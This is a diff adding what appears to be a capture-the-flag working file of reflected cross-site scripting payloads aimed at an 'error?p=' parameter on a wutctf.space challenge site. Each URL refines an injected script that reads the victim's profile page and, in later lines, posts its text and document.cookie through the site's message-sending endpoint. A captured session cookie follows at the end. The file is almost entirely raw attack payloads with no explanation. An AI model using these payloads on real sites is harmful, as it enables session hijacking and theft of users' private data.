@@ -1,0 +1,13 @@
+http://obxssession.wutctf.space/error?p=<script>var req=new XMLHttpRequest();req.open('GET', 'http://obxssession.wutctf.space/profile');</script>
+
+http://obxssession.wutctf.space/error?p=<script>var req=new XMLHttpRequest();req.open('GET', 'http://obxssession.wutctf.space/profile');req.send(null);console.log(req.response);</script>
+
+http://obxssession.wutctf.space/error?p=<script>var req=new XMLHttpRequest();req.open('GET', 'http://obxssession.wutctf.space/profile', false);req.send(null);console.log(req.responseText);</script>
+
+http://obxssession.wutctf.space/error?p=<script>var req=new XMLHttpRequest();req.open('GET','http://obxssession.wutctf.space/profile',false);req.send(null);var bodyText=req.responseText;req.open('POST','http://obxssession.wutctf.space/send');req.setRequestHeader("Set-Cookie",document.cookie);req.setRequestHeader("Content-Type","application/x-www-form-urlencoded");req.send('receiver=10%26subject=exploit%26contents='%2BbodyText);console.log(req.responseText);</script>
+
+http://obxssession.wutctf.space/error?p=<script>var%20req=new%20XMLHttpRequest();req.open('GET','http://obxssession.wutctf.space/profile',false);req.send(null);var%20bodyText=req.responseText;req.open('POST','http://obxssession.wutctf.space/send');req.setRequestHeader("Set-Cookie",document.cookie);req.setRequestHeader("Content-Type","application/x-www-form-urlencoded");req.send('receiver=10%26subject=exploit%26contents='%2BbodyText);console.log(req.responseText);</script>
+
+http://obxssession.wutctf.space/error?p=<script>var%20req=new%20XMLHttpRequest();req.open('POST','http://obxssession.wutctf.space/send');req.setRequestHeader("Set-Cookie",document.cookie);req.setRequestHeader("Content-Type","application/x-www-form-urlencoded");req.send('receiver=10%26subject=exploit%26contents='%2Bdocument.cookie);console.log(req.responseText);</script>
+
+session=.eJwlzj0OwjAMQOG7ZK5Q4vw5nbhJ5Ti2GqkBqaUsiLsDYnzT915m0V2O1cyP_ZTJLL2Z2WCxrSbXaiYqNmhsTFCACYFRtGIW5FItN09Rvw2Ba0zSrMSsFKgxSPKkzkeniMwNS4g1e3VJE0koMRSsQjYrBBdTsj8sACRgp2Yy5yH7f6bT2OjZj_U6-q0P2up2yoXvw7w_UE46MA.XKzJkA.VVqRDL6DAI93acWrBkR28OqvvrE
